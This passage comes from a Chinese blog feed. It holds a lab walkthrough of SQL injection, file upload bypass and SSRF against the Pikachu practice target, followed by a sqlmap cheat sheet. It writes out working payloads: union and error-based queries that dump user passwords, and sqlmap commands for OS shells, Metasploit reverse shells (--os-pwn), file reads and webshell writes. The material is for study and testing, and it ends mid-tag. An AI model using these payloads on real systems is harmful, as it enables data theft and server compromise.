title="sql注入"></a>sql注入</h1><pre><code>在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</code></pre><h2 id="分隔符和注释符"><a href="#分隔符和注释符" class="headerlink" title="分隔符和注释符"></a>分隔符和注释符</h2><ul><li>url使用<code>空格</code>或者<code>%20</code></li><li>burp使用 <code>+</code></li><li>get使用 <code>--+</code> 注释</li><li>post使用 <code>#</code> 注释</li></ul><h2 id="注入常用函数"><a href="#注入常用函数" class="headerlink" title="注入常用函数"></a>注入常用函数</h2><ul><li>like ‘ro%’            # 判断ro或ro…是否成立</li><li>regexp ‘^xiaodi[a-z]’ # 正则,匹配xiaodi及xiaodi…等</li><li>if(条件,5,0)           # 条件成立 返回5 反之 返回0</li><li>sleep(5)              # SQL语句延时执行5秒</li><li>mid(a,b,c)            # 从位置b开始，截取a字符串的c位</li><li>substr(a,b,c)         # 从b位置开始，截取字符串a的c长度,从1开始</li><li>left(database(),1)    # 从左侧截取a的前b位</li><li>length(database())&#x3D;8  # 判断数据库当前库名的长度</li><li>ord&#x3D;ascii ascii(x)&#x3D;97 # 判断x的ascii码是否等于97</li><li>limit(a,b)            # 限制行数,从a条记录开始,返回b条记录 limit(1,1)<h2 id="数字型注入-POST"><a href="#数字型注入-POST" class="headerlink" title="数字型注入(POST)"></a>数字型注入(POST)</h2></li></ul><ol><li><p>使用burpsuite抓包,对参数判断注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>=1<span class="string">&#x27; and=1 &amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br></pre></td></tr></table></figure></li><li><p>报错,尝试注入<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151333668.png?token=ARYCSAS5X3DNSIBK2JN7L5DCQCIOO"></p></li><li><p>尝试注入,2列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>=1 order by 2&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure></li><li><p>爆出回显位</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>=1 union select 1,2&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151335056.png?token=ARYCSAUNWHHQI3WY2EMVR6TCQCIUC"></p></li><li><p>爆库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>=1 union select database(),user()&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151335214.png?token=ARYCSAXY7XPWYZ52NLBN633CQCIWC"></p></li><li><p>爆表名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>=1  union select 1,group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="comment">#</span></span><br><span class="line">&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151336796.png?token=ARYCSASKTPN6D7C276OH2MTCQCIZY"></p></li><li><p>爆字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>=1 union select 1,group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">&#x27;users&#x27;</span></span><br><span class="line">&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151336584.png?token=ARYCSARJ2QB3VIHRUF7BBGLCQCI3C"></p></li><li><p>爆数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>=1 union select 1,(select concat(0x7e,group_concat(username,password),0x7e) from <span class="built_in">users</span> )<span class="comment">#</span></span><br><span class="line">&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151337610.png?token=ARYCSAXFRTG7KB3R6NRVTQDCQCI4S"></p></li></ol><h2 id="字符型-get"><a href="#字符型-get" class="headerlink" title="字符型(get)"></a>字符型(get)</h2><ol><li><p>判断注入,字符型一般都需要闭合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.20.146.195:8080/vul/sqli/sqli_str.php?name=admin<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><p>报错,说明是由 <code>&#39;</code> 引起的注入</p></li><li><p>万能密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.20.146.195:8080/vul/sqli/sqli_str.php?name=aa<span class="string">&#x27;  or 1=1  --+</span></span><br></pre></td></tr></table></figure><p>会爆出所有账号密码</p></li><li><p>判断列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.20.146.195:8080/vul/sqli/sqli_str.php?name=aa<span class="string">&#x27;  order by 2  --+</span></span><br></pre></td></tr></table></figure><p>回显正常说明2列</p></li><li><p>爆所有库名</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">10.20</span>.<span class="number">146.195</span>:<span class="number">8080</span><span class="regexp">/vul/</span>sqli/sqli_str.php?name=admin<span class="string">&#x27;  union select 1,group_concat(schema_name) from information_schema.schemata--+</span></span><br></pre></td></tr></table></figure></li></ol><p>5.爆表名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.20.146.195:8080/vul/sqli/sqli_str.php?name=admin<span class="string">&#x27;  union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure><p>6.爆列名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.20.146.195:8080/vul/sqli/sqli_str.php?name=admin<span class="string">&#x27;  union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>7.爆数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.20.146.195:8080/vul/sqli/sqli_str.php?name=admin<span class="string">&#x27;  union select (select group_concat(username) from users),((select group_concat(password) from users))--+</span></span><br></pre></td></tr></table></figure><h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><ol><li><p>判断注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.20.146.195:8080/vul/sqli/sqli_search.php?name=1<span class="string">&#x27; </span></span><br></pre></td></tr></table></figure><p>基于 <code>&#39;</code> 注入</p></li><li><p>万能密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.20.146.195:8080/vul/sqli/sqli_search.php?name=1<span class="string">&#x27; or 1=1 --+</span></span><br></pre></td></tr></table></figure><p>会爆出所有密码</p></li><li><p>猜解列名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.20.146.195:8080/vul/sqli/sqli_search.php?name=1<span class="string">&#x27; order by 3 --+ </span></span><br></pre></td></tr></table></figure><p>3回显正常,4报错,说明有3列</p></li><li><p>爆数据<br>如上</p></li></ol><h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><ol><li><p>判断注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.20.146.195:8080/vul/sqli/sqli_x.php?name=1<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>报错</p></li><li><p>闭合语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.20.146.195:8080/vul/sqli/sqli_x.php?name=1<span class="string">&#x27;)  and 1 = 1 --+</span></span><br></pre></td></tr></table></figure><p>基于 <code>&#39;)</code> 引起的注入</p></li><li><p>爆库<br>步骤如上</p></li></ol><h2 id="insert-amp-update注入"><a href="#insert-amp-update注入" class="headerlink" title="insert&amp;update注入"></a>insert&amp;update注入</h2><h3 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h3><p>注册为insert注入,首先注册</p><ol><li><p>判断注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add=&amp;email=&amp;password=123&amp;phonenum=&amp;sex=&amp;submit=submit&amp;username=aa<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>由 <code>&#39;</code> 引起报错</p></li><li><p>爆库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add=&amp;email=&amp;password=qwe&amp;phonenum=&amp;sex=&amp;submit=submit&amp;username=123<span class="string">&#x27;  and extractvalue(0x0a,concat(0x0a,(select database())))  and &#x27;</span><span class="comment"># </span></span><br></pre></td></tr></table></figure><p>使用报错注入,必须要报错,所以使用 <code>and</code> 让语句报错</p></li><li><p>爆表名 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=123<span class="string">&#x27;  and extractvalue(0x0a,concat(0x0a,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,32)))  and  &#x27;</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>但是报错注入<code>只会报出32个字符</code>,所以要使用偏移量substr</p></li><li><p>爆列名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=123<span class="string">&#x27; and </span></span><br><span class="line"><span class="string">extractvalue (1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27; and table_schema=database()),1,32),0x7e)) and  &#x27;</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure></li><li><p>爆数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;username=123<span class="string">&#x27;  and extractvalue(0x0a,concat(0x0a,substr((select group_concat(username) from users),1,32)))  and  &#x27;</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">&amp;username=123<span class="string">&#x27;  and extractvalue(0x0a,concat(0x0a,substr((select group_concat(password) from users),1,32)))  and  &#x27;</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>修改个人信息为update注入,先注册后登录</p><ol><li><p>判断注入点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add=123<span class="string">&#x27;&amp;email=111&amp;phonenum=111&amp;sex=%E7%94%B7&amp;submit=submit</span></span><br></pre></td></tr></table></figure><p>由 <code>&#39;</code> 引起报错</p></li><li><p>爆库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add=123<span class="string">&#x27; and extractvalue(0x0a,concat(0x0a,(select database()))) #&amp;email=111&amp;phonenum=111&amp;sex=%E7%94%B7&amp;submit=submit </span></span><br></pre></td></tr></table></figure></li><li><p>爆表名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add=123<span class="string">&#x27; and extractvalue(0x0a,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) </span></span><br></pre></td></tr></table></figure></li><li><p>后续操作如上</p></li></ol><h2 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h2><ol><li><p>判断注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=56<span class="string">&#x27;  --+</span></span><br></pre></td></tr></table></figure><p>由 <code>&#39;</code> 引起报错</p></li><li><p>爆库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=56 and  extractvalue(0x0a,concat(0x0a,(select database()))) --+</span><br></pre></td></tr></table></figure><p>使用报错注入</p></li></ol><h2 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h2><ol><li>抓包判断注入<br>由 <code>&#39;</code> 引起的注入</li></ol><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151339050.png?token=ARYCSAQFEL42LGPO2MJ7EX3CQCJDS"></p><ol start="2"><li>注入<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; and extractvalue(0x0a,concat(0x0a,(select database()))) and &#x27;</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>此处需要使用 <code>and &#39;</code> 闭合语句</li></ol><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151338332.png?token=ARYCSAT4PLVT4OXNI4EO4VTCQCJBA"></p><h2 id="基于boolian的盲注"><a href="#基于boolian的盲注" class="headerlink" title="基于boolian的盲注"></a>基于boolian的盲注</h2><p>没有回显,也没有报错信息,sqlmap直接梭哈</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://localhost/vul/sqli/sqli_blind_b.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2#&#x27;</span> --batch --threads 10 --dbs </span><br></pre></td></tr></table></figure><h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>sqlmap梭哈</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>在PHP配置文件中magic_quotes_gpc&#x3D;On或者使用addslashes函数，icov函数,mysql_real_escape_string函数、mysql_escape_string函数等，提交的参数中如果带有单引号’，就会被自动转义&#39;，这样就使得多数注入攻击无效。<br>当输入单引号，假设这里我们使用addslashes转义，对应的url编码是：<br><code>&#39; –&gt;\&#39;–&gt; %5c%27</code><br>当在前面引入一个ASCII大于128的字符【比如%df、%aa】，url编码变为：<br><code>%df&#39; –&gt; %df\&#39; –&gt; (%df%5C)%27–&gt;(数据库GBK)–&gt;運&#39;</code><br>前端输入**%df’时首先经过上面addslashes函数和浏览器url编码转义变成了%df%5c%27**<br>因为数据库使用GBK编码的话，**%df%5c会被当作一个汉字处理,转换成了汉字”運”**，从而使%27（单引号）逃出生天，成功绕过,利用这个特性从而可实施SQL注入的利用。 <a href="https://jwt1399.top/posts/32179.html#toc-heading-75">原文</a></p><ol><li>爆列数<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1%<span class="built_in">df</span><span class="string">&#x27;  union select 1,2# &amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br></pre></td></tr></table></figure></li><li>爆库名<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1%<span class="built_in">df</span><span class="string">&#x27;  union select 1,database()# &amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="unsafe-upfileupload"><a href="#unsafe-upfileupload" class="headerlink" title="unsafe upfileupload"></a>unsafe upfileupload</h1><p>文件上传</p><h2 id="客户端check"><a href="#客户端check" class="headerlink" title="客户端check"></a>客户端check</h2><p>前端校验,抓包修改<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151515028.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151516450.png"></p><h2 id="服务端check"><a href="#服务端check" class="headerlink" title="服务端check"></a>服务端check</h2><p>检查MIME,一样抓包修改<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151529002.png"></p><h2 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h2><p>上传图片马,配合文件包含漏洞或者解析漏洞<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151534906.png"></p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><pre><code>SSRF(Server-Side Request Forgery:服务器端请求伪造)其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据数据流:攻击者-----&gt;服务器----&gt;目标地址根据后台使用的函数的不同,对应的影响和利用方法又有不一样PHP中下面函数的使用不当会导致SSRF:</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">fsockopen</span>()</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>()</span><br></pre></td></tr></table></figure><h2 id="SSRF-CURL"><a href="#SSRF-CURL" class="headerlink" title="SSRF(CURL)"></a>SSRF(CURL)</h2><p>读取本地文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205232147803.png"></p><h2 id="SSRF-file-get-contents"><a href="#SSRF-file-get-contents" class="headerlink" title="SSRF(file_get_contents)"></a>SSRF(file_get_contents)</h2><p>同上</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;暴力破解&quot;&gt;&lt;a href=&quot;#暴力破解&quot; class=&quot;headerlink&quot; title=&quot;暴力破解&quot;&gt;&lt;/a&gt;暴力破解&lt;/h1&gt;&lt;h2 id=&quot;基于表单的暴力破解&quot;&gt;&lt;a href=&quot;#基于表单的暴力破解&quot; class=&quot;headerlink&quot; title=&quot;基于表单的暴力破解&quot;&gt;&lt;/a&gt;基于表单的暴力破解&lt;/h2&gt;&lt;p&gt;抓取登录数据包&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202205291529117.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;发送到intruder模块,设置爆破的参数&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202205291531603.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;设置payload&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202205291532226.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="靶场" scheme="http://example.com/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="靶场" scheme="http://example.com/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap使用</title>
    <link href="http://example.com/2022/04/28/sqlmap%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2022/04/28/sqlmap%E4%BD%BF%E7%94%A8/</id>
    <published>2022-04-28T04:00:25.000Z</published>
    <updated>2022-05-05T06:44:09.213Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><ul><li>-u  #注入点 </li><li>-f  #指纹判别数据库类型 </li><li>-b  #获取数据库版本信息 </li><li>-p  #指定可测试的参数(?page&#x3D;1&amp;id&#x3D;2 -p “page,id”) </li><li>-D “”  #指定数据库名 </li><li>-T “”  #指定表名 </li><li>-C “”  #指定字段 </li><li>-s “”  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume) </li><li>–level&#x3D;(1-5) #要执行的测试水平等级，默认为1 </li><li>–risk&#x3D;(0-3)  #测试执行的风险等级，默认为1 </li><li>–time-sec&#x3D;(2,5) #延迟响应，默认为5 </li><li>–data #通过POST发送数据 </li><li>–columns        #列出字段 </li><li>–current-user   #获取当前用户名称 </li><li>–current-db     #获取当前数据库名称 </li><li>–users          #列数据库所有用户 </li><li>–passwords      #数据库用户所有密码 </li><li>–privileges     #查看用户权限(–privileges -U root) </li><li>-U               #指定数据库用户 </li><li>–dbs            #列出所有数据库 </li><li>–tables -D “”   #列出指定数据库中的表 </li><li>–columns -T “user” -D “mysql”#列出mysql数据库中的user表的所有字段</li><li>–dump-all            #列出所有数据库所有表 </li><li>–exclude-sysdbs      #只列出用户自己新建的数据库和表 </li><li>–dump -T “” -D “” -C “”   #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname) </li><li>–dump -T “” -D “” –start 2 –top 4  # 列出指定数据库的表的2-4字段的数据 </li><li>–dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </li><li>–os      #指定系统(Linux,Windows) </li><li>-v  #详细的等级(0-6)     0：只显示Python的回溯，错误和关键消息。<br>  1.显示信息和警告消息。<br>  2：显示调试消息。<br>  3：有效载荷注入。<br>  4：显示HTTP请求。<br>  5：显示HTTP响应头。<br>  6：显示HTTP响应页面的内容 </li><li>–privileges  #查看权限 </li><li>–is-dba      #是否是数据库管理员 </li><li>–roles       #枚举数据库用户角色 </li><li>–udf-inject  #导入用户自定义函数（获取系统权限） </li><li>–union-check  #是否支持union 注入 </li><li>–union-cols #union 查询表记录 </li><li>–union-test #union 语句测试 </li><li>–union-use  #采用union 注入 </li><li>–union-tech orderby #union配合order by </li><li>–data “” #POST方式提交数据(–data “page&#x3D;1&amp;id&#x3D;2”) </li><li>–cookie “用;号分开”      #cookie注入(–cookies&#x3D;”PHPSESSID&#x3D;mvijocbglq6pi463rlgk1e4v52; security&#x3D;low”) –referer “”     #使用referer欺骗(–referer “http:&#x2F;&#x2F;“) </li><li>–user-agent “”  #自定义user-agent</li><li>–random-agent #随机ua </li><li>– tamper #使用防过滤脚本 </li><li>–proxy “<a href="http://127.0.0.1:8118&quot;">http://127.0.0.1:8118&quot;</a> #代理注入 </li><li>–string&#x3D;””    #指定关键词,字符串匹配. </li><li>–threads 　　  #采用多线程(–threads 3) </li><li>–sql-shell    #执行指定sql命令 </li><li>–sql-query    #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user &#x3D; ‘root’ LIMIT 0, 1” ) </li><li>–file-read    #读取指定文件 </li><li>–file-write   #写入本地文件(–file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt;将本地的test.txt文件写入到目标的1.txt) </li><li>–file-dest    #要写入的文件绝对路径 </li><li>–os-cmd&#x3D;id    #执行系统命令 </li><li>–os-shell     #系统交互shell </li><li>–os-pwn       #反弹shell(–os-pwn –msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3&#x2F;) </li><li>–msf-path&#x3D;    #matesploit绝对路径(–msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3&#x2F;) </li><li>–os-smbrelay  # </li><li>–os-bof       # </li><li>–reg-read     #读取win系统注册表 </li><li>–priv-esc     # </li><li>–time-sec&#x3D;    #延迟设置 默认–time-sec&#x3D;5 为5秒 -p “user-agent” –user-agent “sqlmap&#x2F;0.7rc1 (<a href="http://sqlmap.sourceforge.net)&quot;/">http://sqlmap.sourceforge.net)&quot;</a>  #指定user-agent注入 </li><li>–eta          #盲注 &#x2F;pentest&#x2F;database&#x2F;sqlmap&#x2F;txt&#x2F;common-columns.txt　　字段字典　　　<br>  common-outputs.txt<br>  common-tables.txt      表字典<br>  keywords.txt<br>  oracle-default-passwords.txt<br>  user-agents.txt<br>  wordlist.txt <h2 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">1. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --<span class="built_in">users</span> --passwords --dbs -v 0</span><br><span class="line"> </span><br><span class="line">2. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2</span><br><span class="line"> </span><br><span class="line">3. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T <span class="built_in">users</span> -C username -D userdb --start 2 --stop 3 -v 2</span><br><span class="line"> </span><br><span class="line">4. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C <span class="string">&quot;user,pass&quot;</span>  -v 1 --exclude-sysdbs</span><br><span class="line"> </span><br><span class="line">5. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 </span><br><span class="line"></span><br><span class="line">6. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read <span class="string">&quot;c:\boot.ini&quot;</span> -v 2 </span><br><span class="line"></span><br><span class="line">7. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2</span><br><span class="line"> </span><br><span class="line">8. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd <span class="string">&quot;id&quot;</span> -v 1 </span><br><span class="line"></span><br><span class="line">9. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 </span><br><span class="line"></span><br><span class="line">10. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1</span><br><span class="line"> </span><br><span class="line">11. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1</span><br><span class="line"> </span><br><span class="line">12. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1</span><br><span class="line"> </span><br><span class="line">13. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=<span class="string">&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot;</span> --reg-value=Test --reg-type=REG_SZ --reg-data=1</span><br><span class="line"> </span><br><span class="line">14. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta</span><br><span class="line"> </span><br><span class="line">15. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -p <span class="built_in">id</span> --prefix <span class="string">&quot;&#x27;)&quot;</span> --suffix <span class="string">&quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;</span></span><br><span class="line"></span><br><span class="line">16. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --auth-type Basic --auth-cred <span class="string">&quot;testuser:testpass&quot;</span></span><br><span class="line"></span><br><span class="line">17. /sqlmap.py -l burp.log --scope=<span class="string">&quot;(www)?\.target\.(com|net|org)&quot;</span></span><br><span class="line"></span><br><span class="line">18. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3</span><br><span class="line"> </span><br><span class="line">19. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --sql-query <span class="string">&quot;SELECT &#x27;foo&#x27;&quot;</span> -v 1</span><br><span class="line"> </span><br><span class="line">20. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --common-tables -D testdb --banner</span><br><span class="line"> </span><br><span class="line">21. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --cookie=<span class="string">&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot;</span> --string=<span class="string">&#x27;xx&#x27;</span> --dbs --level=3 -p <span class="string">&quot;uid&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="注入流程"><a href="#注入流程" class="headerlink" 